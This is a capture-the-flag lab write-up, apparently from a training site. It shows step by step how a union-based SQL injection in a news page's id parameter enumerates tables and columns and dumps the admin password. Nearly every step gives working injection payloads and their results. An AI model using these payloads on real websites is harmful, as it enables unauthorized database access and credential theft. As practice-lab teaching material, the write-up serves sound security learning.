# Lab 1 SQL Injection for Admin Password

## 0x00 Lab Site

Lab site from [zkaq.org][1]

## 0x01 Go Hack It

### Main Page

![](./imgs/0_main_page.jpg)

### News Page

News page has a variable **id** in url. Looks like an injection point.

![](./imgs/1_news.jpg)

### Confirm Injection Point

Try with the following 

```sql
?id=1'
```

![](./imgs/2_confirm_0.jpg)

```sql
?id=1 AND 1=1
```

![](./imgs/2_confirm_1.jpg)

```sql
?id=1 AND 1=2
```

![](./imgs/2_confirm_2.jpg)

So these show the url can be use to inject into database.

### Get Table Fields Number

```sql
?id=1 AND 1=1 ORDER BY 10
```

![](./imgs/3_fields_0.jpg)

Reduce **ORDER BY** number until it shows web page properly again.

```sql
?id=1 AND 1=1 ORDER BY 2
```

![](./imgs/3_fields_1.jpg)

While **ORDER BY 3** still shows ERROR but **ORDER BY 2** can perform correct. This means the Table selection has **2** fields.

### Check Output Locations

```sql
?id=1 AND 1=2 UNION SELECT 1,2
```

![](./imgs/4_location.jpg)

So we can use **FIELD 2** as output field. 

### Get Database Version

```sql
?id=1 AND 1=2 UNION SELECT 1,VERSION()
```

![](./imgs/5_version.jpg)

When serach on [Google][2], it is erther MySQL or MariaDB.

![](./imgs/5_google_ver.jpg)

### Get Current TABLE_SCHEMA

```sql
?id=1 AND 1=2 UNION SELECT 1,DATABASE()
```

![](./imgs/6_table_schema.jpg)

So the TABLE_SCHEMA = **maoshe**

### Get TABLE Numbers

```sql
?id=1 AND 1=2 UNION SELECT 1,COUNT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()
```

![](./imgs/7_table_number.jpg)

So there are **5** tables in this schema.

### Get TABLE_NAME

With **OFFSET 0-4**, we can get all the TABLES.

```sql
?id=1 AND 1=2 UNION SELECT 1,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 1 OFFSET 0
```

| OFFSET | TABLE_NAME   |
| ------ | ------------ |
| 0      | admin        |
| 1      | dirs         |
| 2      | news         |
| 3      | sqlmapoutput |
| 4      | xss          |

![](./imgs/8_table_name.jpg)

So the useful TABLE_NAME = **admin**

### Get COLUMN Numbers

```sql
?id=1 AND 1=2 UNION SELECT 1,COUNT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME='admin'
```

![](./imgs/9_column_number.jpg)

So there are **3** columns in this table.

### Get COLUMN_NAME

With **OFFSET 0-2**, we can get all the COLUMNS.

```sql
?id=1 AND 1=2 UNION SELECT 1,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME='admin' LIMIT 1 OFFSET 0
```

| OFFSET | COLUMN_NAME  |
| ------ | ------------ |
| 0      | Id           |
| 1      | username     |
| 2      | password     |

![](./imgs/10_column_name.jpg)

### Dump Data

```sql
?id=1 AND 1=2 UNION SELECT 1,password FROM admin WHERE username='admin'
```

![](./imgs/11_flag.jpg)

Finally get the **FLAG** = **hellohack**

[1]: https://hack.zkaq.org/?a=battle&f=target&id=485e58d0afa7e4f7
[2]: https://www.google.com/search?q=5.5.53